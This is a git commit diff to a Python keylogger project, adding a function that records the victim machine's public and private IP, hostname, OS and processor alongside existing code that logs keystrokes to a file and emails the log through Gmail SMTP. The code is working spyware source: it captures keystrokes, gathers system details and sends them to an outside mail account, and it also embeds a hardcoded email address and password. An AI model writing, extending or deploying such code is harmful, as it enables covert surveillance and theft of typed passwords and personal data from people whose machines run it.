43aed302178f1c09b79b9105ff00533c321854bd
RahulSankhla312 <rahulsankhla312@gmail.com>
2023-01-30 14:20:18 +0530

    Added computer information function

--- Project/keylogger.py
+++ Project/keylogger.py
@@ -36,6 +36,7 @@ from PIL import ImageGrab  # screenshot library
 # Default Variables
 
 keys_information = "key_log.txt"
+system_information = "system_info.txt"
 email_address = "trashkeylogger@gmail.com"  # trash email address
 password = "fyylgrzcjqftecbt"
 toaddr = "trashkeylogger@gmail.com"
@@ -46,19 +47,26 @@ extend = "\\"  # it will add a extra slash in the path so that we can access the
 
 
 def send_email(filename, attachment, toaddr):
+    # MIMEMultipart is a class that is used to create a message object that is a multipart message.
     msg = MIMEMultipart()
+
     msg['From'] = email_address
     msg['To'] = toaddr
     msg['Subject'] = "Log File"
+
     body = "Body of the Mail"
     msg.attach(MIMEText(body, 'plain'))
+
     filename = filename
     attachment = open(attachment, 'rb')
+
     p = MIMEBase('application', 'octet-stream')
     p.set_payload((attachment).read())
     encoders.encode_base64(p)
     p.add_header('Content-Disposition', "attachment; filename=%s" % filename)
     msg.attach(p)
+
+    # 587 is the port number used to send email
     s = smtplib.SMTP('smtp.gmail.com', 587)
     s.starttls()
     s.login(email_address, password)
@@ -68,6 +76,33 @@ def send_email(filename, attachment, toaddr):
 
 
 send_email(keys_information, file_path + extend + keys_information, toaddr)
+
+
+# getting Computer Information
+
+def computer_information():
+    with open(file_path + extend + system_information, "a") as f:
+        hostname = socket.gethostname()
+        IPAddr = socket.gethostbyname(hostname)
+
+        try:
+            # get public ip address
+            public_ip = get("https://api.ipify.org").text
+            f.write("Public IP Address: " + public_ip + '\n')
+        except Exception:
+            f.write("Couldn't get Public IP Address (most likely max query)")
+
+        # processor information
+        f.write("Processor: " + (platform.processor()) + '\n')
+        f.write("System: " + platform.system() + " " +
+                platform.version() + '\n')  # system information
+        f.write("Mchine: " + platform.machine() + '\n')  # machine information
+        f.write("Hostname: " + hostname + '\n')  # hostname information
+        f.write("Private IP Address: " + IPAddr + '\n')  # private ip address
+
+
+computer_information()
+
 
 # Key Logger Functionality
 count = 0
@@ -80,22 +115,23 @@ def on_press(key):
     count += 1
     if count >= 1:
         count = 0
-        write_file(keys)
+        write_file(keys)  # write the keys in the file
         keys = []
 
 
 def write_file(keys):
-    with open(file_path + extend + keys_information, "a") as f:
+    with open(file_path + extend + keys_information, "a") as f:  # a is used to append the file
         for key in keys:
+            # replace the single quotes with nothing
             k = str(key).replace("'", "")
-            if "space" in k:
+            if "space" in k:  # if space is pressed then add a space
                 f.write('\n')
             elif "Key" not in k:
                 f.write(k)
 
 
 def on_release(key):
-    if key == Key.esc:
+    if key == Key.esc:  # if escape key is pressed then stop the keylogger
         return False
 
 
